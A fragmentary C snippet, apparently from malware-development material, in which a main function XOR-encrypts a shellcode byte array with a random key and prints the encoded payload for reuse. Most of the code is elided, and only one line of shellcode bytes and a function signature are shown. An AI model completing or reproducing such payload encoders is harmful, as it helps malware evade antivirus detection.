...
0x0a,0xd3,0x37,0x03,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,
...
VOID XorVersion3(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize) {
...
int main() {
	...
	XorVersion3(pPayload, sizeof(pPayload), randomKey, sizeof(randomKey));
	printf("\nBYTE pPayload[] = {");
